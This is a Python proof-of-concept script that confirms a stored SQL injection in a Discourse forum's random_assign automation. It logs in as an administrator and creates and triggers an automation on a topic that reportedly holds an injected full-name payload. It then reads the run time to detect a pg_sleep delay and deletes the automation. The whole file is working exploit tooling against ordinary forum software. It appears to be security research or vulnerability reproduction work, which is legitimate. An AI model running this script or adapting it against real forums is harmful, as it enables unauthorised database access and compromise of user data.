#!/usr/bin/env python3
import datetime
import json
import os
import sys
import time
from pathlib import Path

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE_URL", "http://wsl.evm.pics:31655")).rstrip("/")
# Topic 35 is the confirmed live reproduction topic whose assignment history contains
# action_code_who with the injected full-name payload.
TOPIC_ID = str(os.environ.get("TOPIC_ID") or (sys.argv[2] if len(sys.argv) > 2 else "35"))
SLEEP_THRESHOLD = float(os.environ.get("SLEEP_THRESHOLD", "3.0"))


def load_accounts():
    paths = []
    if os.environ.get("ACCOUNTS_JSON"):
        paths.append(Path(os.environ["ACCOUNTS_JSON"]))
    paths.extend([
        Path("workspace/_accounts.json"),
        Path("../../_accounts.json"),
        Path(__file__).resolve().parents[2] / "_accounts.json",
    ])
    for path in paths:
        if path.exists():
            return {a["username"]: a for a in json.loads(path.read_text())}
    return {}


def admin_account():
    if os.environ.get("ADMIN_USERNAME") and os.environ.get("ADMIN_PASSWORD"):
        return {"username": os.environ["ADMIN_USERNAME"], "password": os.environ["ADMIN_PASSWORD"]}
    accounts = load_accounts()
    if "user1" in accounts:
        return accounts["user1"]
    raise SystemExit("FAIL missing admin credentials; set ADMIN_USERNAME/ADMIN_PASSWORD or provide workspace/_accounts.json")


def login(acct):
    s = requests.Session()
    s.headers.update({"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
    r = s.get(f"{BASE}/session/csrf", timeout=10)
    r.raise_for_status()
    csrf = r.json()["csrf"]
    r = s.post(
        f"{BASE}/session",
        data={"login": acct["username"], "password": acct["password"]},
        headers={"X-CSRF-Token": csrf},
        timeout=10,
    )
    if r.status_code >= 400:
        raise SystemExit(f"FAIL admin login returned {r.status_code}: {r.text[:200]}")
    s.headers.update({"X-CSRF-Token": csrf})
    return s


def require_plugins(admin):
    r = admin.get(f"{BASE}/admin/plugins.json", timeout=10)
    r.raise_for_status()
    states = {p.get("id"): p.get("enabled") for p in r.json().get("plugins", [])}
    missing = [pid for pid in ("discourse-assign", "automation") if not states.get(pid)]
    if missing:
        raise SystemExit(f"FAIL required plugin(s) disabled: {', '.join(missing)}")


def create_random_assign(admin):
    r = admin.post(
        f"{BASE}/admin/plugins/automation/automations.json",
        json={"automation": {"script": "random_assign", "trigger": "recurring"}},
        timeout=15,
    )
    if r.status_code >= 400:
        raise SystemExit(f"FAIL creating automation returned {r.status_code}: {r.text[:300]}")
    aid = r.json()["automation"]["id"]
    start = (datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=1)).isoformat()
    fields = [
        {"name": "assignees_group", "component": "group", "target": "script", "metadata": {"value": 3}},
        {"name": "assigned_topic", "component": "text", "target": "script", "metadata": {"value": TOPIC_ID}},
        {"name": "recurrence", "component": "period", "target": "trigger", "metadata": {"value": {"interval": 1, "frequency": "day"}}},
        {"name": "start_date", "component": "date_time", "target": "trigger", "metadata": {"value": start}},
    ]
    r = admin.put(
        f"{BASE}/admin/plugins/automation/automations/{aid}.json",
        json={
            "automation": {
                "name": f"TF random_assign SQLi PoC topic {TOPIC_ID}",
                "script": "random_assign",
                "trigger": "recurring",
                "enabled": True,
                "fields": fields,
            }
        },
        timeout=15,
    )
    if r.status_code >= 400:
        raise SystemExit(f"FAIL updating automation returned {r.status_code}: {r.text[:500]}")
    return aid


def poll_stats(admin, aid):
    for _ in range(45):
        time.sleep(1)
        r = admin.get(f"{BASE}/admin/plugins/automation/automations.json", timeout=15)
        r.raise_for_status()
        for automation in r.json().get("automations", []):
            if automation.get("id") == aid:
                stats = automation.get("stats", {}).get("last_day", {})
                if stats.get("total_runs", 0) >= 1:
                    return stats
    return {}


def main():
    admin = login(admin_account())
    require_plugins(admin)
    automation_id = None
    try:
        automation_id = create_random_assign(admin)
        r = admin.post(f"{BASE}/automations/{automation_id}/trigger.json", timeout=15)
        if r.status_code >= 400:
            raise SystemExit(f"FAIL triggering automation returned {r.status_code}: {r.text[:300]}")
        stats = poll_stats(admin, automation_id)
        print(f"topic_id={TOPIC_ID} automation_id={automation_id} stats={json.dumps(stats, sort_keys=True)}")
        max_run = float(stats.get("max_run_time") or 0)
        if stats.get("total_errors", 0) == 0 and max_run >= SLEEP_THRESHOLD:
            print("PASS random_assign hit the stored SQLi payload; automation runtime shows pg_sleep delay")
            raise SystemExit(0)
        raise SystemExit(f"FAIL no timing proof: max_run_time={max_run:.3f}s total_errors={stats.get('total_errors')}")
    finally:
        if automation_id:
            try:
                admin.delete(f"{BASE}/admin/plugins/automation/automations/{automation_id}.json", timeout=15)
            except Exception:
                pass


if __name__ == "__main__":
    main()
